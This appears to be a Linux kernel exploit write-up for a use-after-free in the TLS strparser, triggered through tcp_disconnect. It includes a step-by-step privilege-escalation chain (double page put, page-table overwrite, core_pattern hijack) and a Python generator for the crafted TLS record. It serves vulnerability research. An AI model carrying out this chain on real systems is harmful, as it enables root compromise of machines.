# Vulnerability

When TLS receive data from TCP side, it will call `tls_strp_read_sock`:

```go
#0  tls_strp_read_sock (strp=0xffff888101f7fb58) at net/tls/tls_strp.c:505
#1  tls_strp_check_rcv (strp=0xffff888101f7fb58) at net/tls/tls_strp.c:543
#2  0xffffffff8257b565 in tls_data_ready (sk=0xffff888020204280) at net/tls/tls_sw.c:2448
#3  0xffffffff824f19d7 in tcp_data_queue (sk=sk@entry=0xffff888020204280, skb=skb@entry=0xffff8880203684e0) at net/ipv4/tcp_input.c:5333
#4  0xffffffff824f2506 in tcp_rcv_established (sk=sk@entry=0xffff888020204280, skb=skb@entry=0xffff8880203684e0) at net/ipv4/tcp_input.c:6287
#5  0xffffffff825014fe in tcp_v4_do_rcv (sk=sk@entry=0xffff888020204280, skb=skb@entry=0xffff8880203684e0) at net/ipv4/tcp_ipv4.c:1916
#6  0xffffffff8250479d in tcp_v4_rcv (skb=0xffff8880203684e0) at net/ipv4/tcp_ipv4.c:2351
#7  0xffffffff824ca1fb in ip_protocol_deliver_rcu (net=net@entry=0xffffffff85293440 <init_net>, skb=0xffff8880203684e0, protocol=<optimized out>) at net/ipv4/ip_input.c:205
#8  0xffffffff824ca3f9 in ip_local_deliver_finish (net=0xffffffff85293440 <init_net>, sk=<optimized out>, skb=<optimized out>) at net/ipv4/ip_input.c:233
#9  0xffffffff823297a9 in __netif_receive_skb_one_core (skb=<optimized out>, pfmemalloc=pfmemalloc@entry=0x0) at net/core/dev.c:5741
#10 0xffffffff82329a49 in __netif_receive_skb (skb=<optimized out>) at net/core/dev.c:5854
#11 process_backlog (napi=0xffff88811c436e08, quota=0x40) at net/core/dev.c:6190
#12 0xffffffff8232a6f8 in __napi_poll (n=0xffff888101f7fb58, n@entry=0xffff88811c436e08, repoll=repoll@entry=0xffffc90000003ebf) at net/core/dev.c:6841
#13 0xffffffff8232acd7 in napi_poll (repoll=0xffffc90000003ed8, n=0xffff88811c436e08) at net/core/dev.c:6910
#14 net_rx_action () at net/core/dev.c:7032
#15 0xffffffff811accd9 in handle_softirqs (ksirqd=<optimized out>) at kernel/softirq.c:579
#16 0xffffffff811ac80b in do_softirq () at kernel/softirq.c:480
```
`tls_strp_read_sock` will call `tls_strp_load_anchor_with_queue` and TLS will set up `strp->anchor` by get the first TCP socket buffer on the TCP receive queue and set it to `skb_shinfo(strp->anchor)->frag_list`:
```C
          tls_strp_load_anchor_with_queue()
            first = tcp_recv_skb(strp->sk, tp->copied_seq, &offset);
            ...
            skb_shinfo(strp->anchor)->frag_list = first;
```
The TCP socket buffer still remains on the tcp receive queue (`sk_receive_queue`), `strp->anchor` just take the skb pointer for the decryption later at `tls_sw_recvmsg`. Problem is, with TCP socket installed with TLS we can call `tcp_disconnect` using connect syscall with AF_UNSPEC like this:
```C
	addr.sin_family = AF_UNSPEC;
	addr.sin_addr.s_addr = htonl(INADDR_ANY);
	addr.sin_port = 0;
	connect(conn, &addr, sizeof(addr));
```

It will call to `tcp_disconnect`:
```C
/*
 *	Connect to a remote host. There is regrettably still a little
 *	TCP 'magic' in here.
 */
int __inet_stream_connect(struct socket *sock, struct sockaddr *uaddr,
			  int addr_len, int flags, int is_sendmsg)
{
	....
	if (uaddr) {
		if (addr_len < sizeof(uaddr->sa_family))
			return -EINVAL;

		if (uaddr->sa_family == AF_UNSPEC) {
			err = sk->sk_prot->disconnect(sk, flags);
			sock->state = err ? SS_DISCONNECTING : SS_UNCONNECTED;
			goto out;
		}
	}

}
int tcp_disconnect(struct sock *sk, int flags)
{
        ...
	__skb_queue_purge(&sk->sk_receive_queue);
        ...
}
```

`__skb_queue_purge` will free the skb while it still hold by `strp->anchor->frag_list`.

# Exploitation
If we call `tls_sw_recvmsg` and finally it will reach `tls_decrypt_sg` there are a few places that it uses our freed skb. For example, `skb_to_sgvec` and `skb_nsg`:
```C
static int tls_decrypt_sg(struct sock *sk, struct iov_iter *out_iov,
			  struct scatterlist *out_sg,
			  struct tls_decrypt_arg *darg)
{

	struct sk_buff *skb = tls_strp_msg(ctx); // strp->anchor
	....
	n_sgin = skb_nsg(skb, rxm->offset + prot->prepend_size,
			 rxm->full_len - prot->prepend_size);
	....
	err = skb_to_sgvec(skb, &sgin[1],
			   rxm->offset + prot->prepend_size,
			   rxm->full_len - prot->prepend_size);
```
But there's no any meaningful operation to use it as exploitation because those function only perform UAF read when it read `skb_shinfo(skb)->frag_list` (our freed skb placed).

Another path that use our freed skb in `skb_shinf(skb)->frag_list` is via this path, we can reach this line when we perform async decryption:

```C
static int tls_decrypt_sg(struct sock *sk, struct iov_iter *out_iov,
			  struct scatterlist *out_sg,
			  struct tls_decrypt_arg *darg)
{
        ....
	if (unlikely(darg->async)) {
		err = tls_strp_msg_hold(&ctx->strp, &ctx->async_hold);
		if (err)
			__skb_queue_tail(&ctx->async_hold, darg->skb);
		return err;
	}
}
```
It will reach `skb_clone` path at `tls_strp_msg_hold`:
```C
int tls_strp_msg_hold(struct tls_strparser *strp, struct sk_buff_head *dst)
{
        struct skb_shared_info *shinfo = skb_shinfo(strp->anchor);
        ....
		struct sk_buff *iter, *clone;
		int chunk, len, offset;

		offset = strp->stm.offset;
		len = strp->stm.full_len;
		iter = shinfo->frag_list; // our freed skb

		while (len > 0) {
			if (iter->len <= offset) {
				offset -= iter->len;
				goto next;
			}

			chunk = iter->len - offset;
			offset = 0;

			clone = skb_clone(iter, strp->sk->sk_allocation);
			if (!clone)
				return -ENOMEM;
			__skb_queue_tail(dst, clone);

			len -= chunk;
next:
			iter = iter->next;
		}
	}
}
```

If we succesfully clone our freed skb, it will queued to the `ctx->async_hold`. After decryption finish, cloned skb that resides at `ctx->async_hold` will free at `__skb_queue_purge`.

```C
int tls_sw_recvmsg(struct sock *sk,
		   struct msghdr *msg,
		   size_t len,
		   int flags,
		   int *addr_len)
{
	...
recv_end:
	if (async) {
		int ret;

		/* Wait for all previously submitted records to be decrypted */
		ret = tls_decrypt_async_wait(ctx);
		__skb_queue_purge(&ctx->async_hold);
}

static inline void __skb_queue_purge_reason(struct sk_buff_head *list,
					    enum skb_drop_reason reason)
{
	struct sk_buff *skb;

	while ((skb = __skb_dequeue(list)) != NULL)
		kfree_skb_reason(skb, reason);
}

static inline void __skb_queue_purge(struct sk_buff_head *list)
{
	__skb_queue_purge_reason(list, SKB_DROP_REASON_QUEUE_PURGE);
}
```

## Mitigation exploit (6.1.x)
In skb, there's a data structure called `skb_shared_info`. Usually it contain non linear skb data, for example such skb that hold spliced page pointer, linked skb, etc.:
```C
/* This data is invariant across clones and lives at
 * the end of the header data, ie. at skb->end.
 */
struct skb_shared_info {
	__u8		flags;
	__u8		meta_len;
	__u8		nr_frags;
	__u8		tx_flags;
	unsigned short	gso_size;
	/* Warning: this field is not always filled in (UFO)! */
	unsigned short	gso_segs;
	struct sk_buff	*frag_list;
	union {
		struct skb_shared_hwtstamps hwtstamps;
		struct xsk_tx_metadata_compl xsk_meta;
	};
	unsigned int	gso_type;
	u32		tskey;

	/*
	 * Warning : all fields before dataref are cleared in __alloc_skb()
	 */
	atomic_t	dataref;
	unsigned int	xdp_frags_size;

	/* Intermediate layers must ensure that destructor_arg
	 * remains valid until skb destructor */
	void *		destructor_arg;

	/* must be last field, see pskb_expand_head() */
	skb_frag_t	frags[MAX_SKB_FRAGS];
};
```
It placed at the end of skb data specifically at `skb->head + skb->end`. If we call `skb_clone`, `__skb_clone` will copy head pointer and increase its `dataref`.
```C
/*
 * You should not add any new code to this function.  Add it to
 * __copy_skb_header above instead.
 */
static struct sk_buff *__skb_clone(struct sk_buff *n, struct sk_buff *skb)
{
#define C(x) n->x = skb->x

	n->next = n->prev = NULL;
	n->sk = NULL;
	__copy_skb_header(n, skb);
	....
	atomic_inc(&(skb_shinfo(skb)->dataref));
	skb->cloned = 1;

	return n;
#undef C
}
```

At `kfree_skb` -> `skb_release_data` it will decrement the `dataref`, if it zero it continue to free the rest.
```C
static void skb_release_data(struct sk_buff *skb)
{
	struct skb_shared_info *shinfo = skb_shinfo(skb);
	int i;

	if (skb->cloned &&
	    atomic_sub_return(skb->nohdr ? (1 << SKB_DATAREF_SHIFT) + 1 : 1,
			      &shinfo->dataref))
		goto exit;
	....
}
```

If we have freed skb, this skb still contain old data so `skb_shinfo(victim_skb)` also contain old data. Old data means, we have `skb_shinfo(victim_skb)->dataref` is 0. If this freed skb is cloned, the dataref will increase to 1 again. Then, this cloned skb is linked to `ctx->async_hold` and will call `__skb_queue_purge` and  reach `skb_release_data` again. Now kernel tries to free our the cloned_skb again based on old `skb_shared_info`.

If we have old spliced page pointer still live in `shinfo->frags`, we can do put page pointer again.
```C
static void skb_release_data(struct sk_buff *skb)
{
	struct skb_shared_info *shinfo = skb_shinfo(skb);
	int i;

	....
	for (i = 0; i < shinfo->nr_frags; i++)
		__skb_frag_unref(&shinfo->frags[i], skb->pp_recycle);
}
```
`__skb_frag_unref` will put page at `shinfo->frags[i]`. So from our freed skb, it already release this `shinfo` and also already put the page from frags, the cloned skb will do release for second time and the page from frags also will put for second time. So we have double put of page.

So these the steps for the mitigation exploit:
1. Create two pairs of TCP sockets: a main pair (`conn` and `client`) and a dummy pair (`dummy_serv` and `dummy_cli`).
2. Set up TLS on the `client` socket.
3. Write a crafted TLS 1.2 record (along with padding) to a pipe.
4. Splice the pipe data into the `conn` socket. This allocates a `victim_skb` holding a reference to the pipe's memory page and sends it to the `client` socket.
5. The kernel gets a data ready notification on the `client` socket, prepares `strp->anchor`, and sets `strp->anchor->frag_list` to the `victim_skb`.
6. Send 1 byte via the `dummy_cli` socket to allocate an interleaving skb (B) in the slab cache.
7. Call `recv` on the `client` socket with an invalid user pointer to trigger an early return and fill `rxm->full_len`.
8. Call `connect` with `AF_UNSPEC` on the TLS-enabled `client` socket to trigger `tcp_disconnect`. This clears the TCP receive queue and frees the `victim_skb` (freeing skb A), but `strp->anchor->frag_list` still holds a reference to it.
9. Read 1 byte from the `dummy_serv` socket to free the interleaving skb (B). By freeing skb B between the two frees of skb A, we achieve an A -> B -> A free pattern that completely bypasses the slab allocator's fast-path adjacent double-free crash detection.
10. Read from the pipe to clear the original data from its buffers.
11. Call `recvmsg` on the `client` socket. The crafted TLS record forces asynchronous decryption, which clones our initially freed skb, processes it, and drops it from the async queue, putting the page for a second time (UAF).
12. Write to the pipe to extract the overlapped page from `pipe->tmp_page` and reclaim it.
13. Touch all the sprayed `mmap` addresses to force the kernel to allocate new page tables that will overlap with our UAF page.
14. Read from the pipe. This reads the page (which is now a kernel PTE pagetable) and frees it back into `pipe->tmp_page`, extracting its raw contents to user space.
15. Because the kernel installs the `empty_zero_page` PTE when our `mmap` pages were initially touched, we can search our leaked pagetable to deduce the base physical address. 
16. Calculate the physical address of `core_pattern` based on the leaked `empty_zero_page` PTE, and write it back to the pipe. This directly injects a fake PTE pointing to `core_pattern` into the live pagetable inside the kernel.
17. Write the payload string `|/proc/%P/fd/666 %P` to the corresponding sprayed user-space memory region, leveraging our fake PTE to overwrite `/proc/sys/kernel/core_pattern` in kernel memory.
18. Trigger a controlled crash in the kernel using `vuln_trigger_core_pattern` to invoke our malicious core dump handler and gain code execution.


### Generating the TLS Payload

Throughout the exploit source code representations, you will notice static `unsigned char tls_record[]` arrays containing the Application Data payload required to reach the vulnerable asynchronous processing path in `tls_sw_recvmsg`. 

These payloads correspond to a purely zeroed-out, AES-CCM encrypted TLS 1.2 record. To calculate valid frame offsets (including Explicit IVs and MAC tags), this structure can be dynamically generated using Python's `cryptography` library.

The script below demonstrates how these arrays were formulated:

```python
import struct
from cryptography.hazmat.primitives.ciphers.aead import AESCCM

def generate_tls_record():
    # The exploit configures TLS via setsockopt:
    # struct tls12_crypto_info_aes_ccm_128 crypto = {0};
    # This zeroes out the key, salt, and IV implicitly.
    
    key = b'\x00' * 16    # 128-bit key
    salt = b'\x00' * 4    # 4-byte implicit salt
    iv = b'\x00' * 8      # 8-byte explicit IV sent on the wire

    # The payload (arbitrary data that fits the math length needed)
    # In this case, exactly 11 bytes of application payload
    payload = b'\x00' * 11

    # AAD (Additional Authenticated Data) construction for TLS 1.2 AEAD
    # sequence_num (8) + type (1) + version (2) + length (2)
    seq_num = b'\x00' * 8     # Assuming it's the first record
    rec_type = b'\x17'        # Application Data (23)
    version = b'\x03\x03'     # TLS 1.2
    
    # Notice that the AAD length is the length of the *plaintext* payload, not the fully encrypted frame.
    length = struct.pack('>H', len(payload))
    aad = seq_num + rec_type + version + length

    # Initialize AES-CCM with our zeroed key and a tag length of 16 (128-bits)
    # The IV for AES-CCM in TLS 1.2 is salt (4 bytes) + explicit IV (8 bytes)
    nonce = salt + iv
    ccm = AESCCM(key, tag_length=16)

    # Encrypt the payload and generate the MAC tag automatically
    encrypted_payload_and_tag = ccm.encrypt(nonce, payload, aad)

    # Build the final TLS 1.2 Record
    # The length in the header covers the explicit IV + Ciphertext + Tag
    record_header = rec_type + version + struct.pack('>H', len(iv) + len(encrypted_payload_and_tag))

    final_record = record_header + iv + encrypted_payload_and_tag

    print("unsigned char tls_record[] = {")
    hex_bytes = [f"0x{b:02x}" for b in final_record]
    
    # Format nicely like the C string counterpart
    print("    " + ", ".join(hex_bytes[:12]) + ",")
    print("    " + ", ".join(hex_bytes[12:24]) + ",")
    print("    " + ", ".join(hex_bytes[24:36]) + ",")
    print("    " + ", ".join(hex_bytes[36:]) + "};")

if __name__ == "__main__":
    generate_tls_record()
```